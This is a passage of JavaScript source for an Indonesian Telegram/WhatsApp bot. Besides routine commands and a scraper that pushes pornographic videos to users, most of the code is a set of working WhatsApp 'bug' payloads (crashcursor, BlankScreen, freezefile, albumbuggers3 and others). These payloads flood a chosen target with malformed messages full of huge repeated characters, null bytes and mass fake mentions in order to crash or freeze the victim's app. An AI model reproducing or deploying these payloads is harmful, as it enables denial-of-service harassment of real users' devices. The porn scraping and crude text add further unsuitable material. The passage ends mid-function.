            return ctx.reply('❌ Tidak ada hasil yang ditemukan.');
        }

        results.slice(0, 5).forEach((result) => {
            const message = `📌 *${result.title}*\n` +
                `📂 Kategori: ${result.category}\n` +
                `👀 Views: ${result.views_count} | 🔄 Shares: ${result.share_count}\n` +
                `[🔗 Lihat Konten](${result.link})\n`;

            if (result.video_2) {
                ctx.replyWithVideo(result.video_2, { caption: message, parse_mode: 'Markdown' });
            } else if (result.video_1) {
                ctx.replyWithVideo(result.video_1, { caption: message, parse_mode: 'Markdown' });
            } else {
                ctx.reply(message, { parse_mode: 'Markdown' });
            }
        });
    } catch (error) {
        console.error(error);
        ctx.reply('⚠️ Terjadi kesalahan saat mencari data.');
    }
});
const welcomeSettings = {}; 

bot.command("welcome", (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
  
  if (!args || (args !== "true" && args !== "false")) {
    return ctx.reply("Gunakan perintah: `/welcome true` atau `/welcome false`", { parse_mode: "Markdown" });
  }

  const chatId = ctx.chat.id;
  welcomeSettings[chatId] = args === "true";

  ctx.reply(`Welcome message telah di${args === "true" ? "aktifkan" : "nonaktifkan"}!`);
});

bot.on("new_chat_members", async (ctx) => {
  const chatId = ctx.chat.id;
  const isWelcomeEnabled = welcomeSettings[chatId];

  if (!isWelcomeEnabled) return;

  const newMember = ctx.message.new_chat_members[0];

  try {
    await ctx.replyWithPhoto(
      imageBuffer,
      {
        caption: mess.welcome,
        parse_mode: "Markdown",
        reply_markup: Markup.inlineKeyboard([
  Markup.button.url("♦️ Join Channel", "https://t.me/Garammanisl")
])
      }
    );
  } catch (error) {
    console.error("Gagal mengirim pesan welcome:", error);
  }
});

bot.command("status", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp terhubung dengan nomor: ${linkedWhatsAppNumber || "Tidak diketahui"}`);
  } else {
    ctx.reply("❌ WhatsApp belum terhubung.");
  }
});
const cheerio = require("cheerio");

const userHentaiLists = {}; // Objek untuk menyimpan daftar hentai berdasarkan user ID

// Fungsi untuk mengambil daftar hentai menggunakan axios
const getHentaiList = async () => {
  try {
    const page = Math.floor(Math.random() * 1153);
    const { data: htmlText } = await axios.get(`https://sfmcompile.club/page/${page}`);
    const $ = cheerio.load(htmlText);

    const hasil = [];
    $("#primary > div > div > ul > li > article").each(function (a, b) {
      const title = $(b).find("header > h2").text().trim();
      const link = $(b).find("header > h2 > a").attr("href");
      const category = $(b)
        .find("header > div.entry-before-title > span > span")
        .text()
        .replace("in ", "")
        .trim();
      const share_count = $(b)
        .find("header > div.entry-after-title > p > span.entry-shares")
        .text()
        .trim();
      const views_count = $(b)
        .find("header > div.entry-after-title > p > span.entry-views")
        .text()
        .trim();
      const type = $(b).find("source").attr("type") || "image/jpeg";
      const video_1 = $(b).find("source").attr("src") || $(b).find("img").attr("data-src");
      const video_2 = $(b).find("video > a").attr("href") || "";

      if (title && link) {
        hasil.push({ title, link, category, share_count, views_count, type, video_1, video_2 });
      }
    });

    return hasil.length ? hasil : null;
  } catch (error) {
    console.error("Error fetching hentai list:", error.message);
    return null;
  }
};

// Fungsi untuk membuat caption
const getCaption = (obj) => `
— Information 
📝  ᴛᴇxᴛ: ${obj.title}
🔗  ʟɪɴᴋ: [Klik Disini](${obj.link})
🏷️  ᴄᴀᴛᴇɢᴏʀʏ: ${obj.category}
📢  ꜱʜᴀʀᴇ ᴄᴏᴜɴᴛ: ${obj.share_count}
👀  ᴠɪᴇᴡꜱ ᴄᴏᴜɴᴛ: ${obj.views_count}
🎞️  ᴛʏᴘᴇ: ${obj.type}
`;

// Command untuk mengambil video
bot.command(["hentaivid", "hentaimp4", "hentaivideo"], async (ctx) => {
  const list = await getHentaiList();

  if (!list) {
    return ctx.reply("⚠️ Gagal mengambil data. Coba lagi nanti.");
  }

  userHentaiLists[ctx.from.id] = list; // Simpan data berdasarkan user ID

  const teks = list.map((obj, index) => ` ▢ ${index + 1}. ${obj.title}`).join("\n");

  ctx.reply(
    `— Starevxz V3.1:\n\n${teks}\n\nᴋᴇᴛɪᴋ ɴᴏᴍᴏʀ ᴠɪᴅᴇᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴛᴀᴍᴘɪʟᴋᴀɴ.`,
    Markup.inlineKeyboard([
      [Markup.button.url("♦️", "https://t.me/Garammanis")],
      [Markup.button.callback("❄️ Mau Lagi", "mau_lagi")],
    ])
  );
});

// Handler untuk memilih video
bot.on("text", async (ctx) => {
  const list = userHentaiLists[ctx.from.id];
  if (!list) return;

  const index = parseInt(ctx.message.text.trim());

  if (isNaN(index) || index < 1 || index > list.length) {
    return ctx.reply("⚠️ Masukkan nomor video yang valid.");
  }

  const selectedObj = list[index - 1];

  ctx.replyWithVideo(
    { url: selectedObj.video_1 || selectedObj.video_2 },
    { caption: getCaption(selectedObj), parse_mode: "Markdown" }
  );
});

// Handler untuk tombol "Mau Lagi"
bot.action("mau_lagi", async (ctx) => {
  await ctx.answerCbQuery();
  const newList = await getHentaiList();

  if (!newList) {
    return ctx.reply("⚠️ Gagal mengambil data baru. Coba lagi nanti.");
  }

  userHentaiLists[ctx.from.id] = newList; // Simpan data berdasarkan user ID

  const teks = newList.map((obj, index) => ` ▢ ${index + 1}. ${obj.title}`).join("\n");

  ctx.editMessageText(
    `— Starevxz V3.1 : \n\n${teks}\n\nᴋᴇᴛɪᴋ ɴᴏᴍᴏʀ ᴠɪᴅᴇᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴛᴀᴍᴘɪʟᴋᴀɴ.`,
    Markup.inlineKeyboard([
      [Markup.button.url("♦️", "https://t.me/Garammanis")],
      [Markup.button.callback("❄️ Mau Lagi", "mau_lagi")],
    ])
  );
});

async function ClPm(target, ThM, cct = false, ptcp = false) {
   let etc = generateWAMessageFromContent(target,
    proto.Message.fromObject({
     viewOnceMessage: {
      message: {
       interactiveMessage: {
        header: {
         title: "",
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 9007199254740991,
          mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
          fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
          fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
          directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1723855952",
          contactVcard: true,
          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
          jpegThumbnail: ThM
         },
         hasMediaAttachment: true
        },
        body: {
         text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
        },
        nativeFlowMessage: {
         messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
         buttons: [
          cct ? {
           name: "single_select",
           buttonParamsJson: "{\"title\":\"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\",\"rows\":[]}]}"
          } : {
           name: "payment_method",
           buttonParamsJson: ""
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}"
          },
          {
           name: "payment_method",
           buttonParamsJson: "{}"
          },
          {
           name: "single_select",
           buttonParamsJson: "{\"title\":\"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\",\"sections\":[{\"title\":\"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\",\"rows\":[]}]}"
          },
          {
           name: "galaxy_message",
           buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
          },
          {
           name: "mpm",
           buttonParamsJson: "{}"
          }
         ]
        }
       }
      }
     }
    }), {
     userJid: target,
     quoted: QBug
    }
   );

   await cay.relayMessage(target, etc.message, ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
  };
  
async function CaywzZdelayMaker(target, o, ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = 'ꦽ'.repeat(1500);

  await cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: o,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
 async function BlankScreen(target, Ptcp = false) {
let virtex =  "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
			await cay.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Halo🤗",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["13135550002@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿'))
   	};
   	   	const caywzzimg = fs.readFileSync('./caywzzimg.jpg')
   	const tdxlol = fs.readFileSync('./tdx.jpeg')
   	const crypto = require('crypto');
async function crashcursor(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "\u0000" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: cay.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© GaramManis",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! Starevxz - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `- GaramManis 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : GaramManis "
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await cay.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
     	async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(250000) + "@0".repeat(250000);
    await cay.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function albumbuggers3(target, mention) {
  const xrellyImg = "https://files.catbox.moe/kst7w4.jpg";
  const Amount = 9999;
  const mentionedSize = 31111;
  const mentionedCustom = [
    "phynxagency@s.whatsapp.net",
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net",
    "13135559999@s.whatsapp.net",
    "13135559098@s.whatsapp.net",
    "16502192547@s.whatsapp.net",
    "5521992999999@s.whatsapp.net"
  ];  
  const mentionedTarget = [
    target
  ];  
  const mentionedList = [
    ...mentionedTarget,
    ...mentionedCustom,
    ...Array.from({ length: mentionedSize }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];  
  const textFlowCrashed = "ꦽ".repeat(Amount);  
  const photo = {
    image: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
    },
    caption: "XrL ~ Only For Bug" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };
  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 9999,
      expectedVideoCount: 1
    }
  }, {
    userJid: target,
    upload: cay.waUploadToServer
  });

  await cay.relayMessage(target, album.message, { messageId: album.key.id });
  
  for (let i = 0; i < 10; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: cay.waUploadToServer
    });
    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: mentionedList,
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      },
      remoteJid: target,
      participant: "0@s.whatsapp.net",
      forwardingScore: 9999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 1
      },
      externalAdReply: {
        title: "ꦾ".repeat(Amount),
        mediaType: 2,
        renderLargerThumbnail: true,
        showAdAttribution: true,
        containsAutoReply: true,
        body: "© PhynxAgency",
        thumbnail: { url: xrellyImg },
        sourceUrl: "about:blank",
        sourceId: cay.generateMessageTag(),
        ctwaClid: "ctwaClid",
        ref: "ref",
        clickToWhatsappCall: true,
        ctaPayload: "ctaPayload",
        disableNudge: false,
        originalimgLink: "about:blank"
      },
      quotedMessage: {
        callLogMesssage: {
        isVideo: true,
        callOutcome: 0,
        durationSecs: "1",
        callType: "VIDEO",
        participants: [
        { jid: target, callOutcome: 1 },
              ]
          }
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: textFlowCrashed,
            phoneNumber: "+5521992999999"
          }
        },
        {
          type: "url",
          urlButton: {
            displayText: textFlowCrashed,
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(55555))
          }
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({ 
            status: true, 
            criador: "PhynxAgency", 
            versao: "@latest", 
            atualizado: "2025-06-03",  
            suporte: "https://wa.me/5521992999999", 
            comandosDisponiveis: [`${command}`], 
            prefixo: `${prefix}`, 
            linguagem: "USA" }) 
            + "\u0000".repeat(Amount)
        }
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
        params: [
            { 
              name: "call_type",
              value: "audio" 
            },
            { 
              name: "permission_reason", 
              value: textFlowCrashed
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await cay.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    if (mention) {
      await cay.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function buginvite(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "caywzz",
                    },
                ],
            },
        };

        await cay.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function crashUiV5(target, Ptcp = false) {
    cay.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "Caywzz"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};
async function systemUi(target, Ptcp = false) {
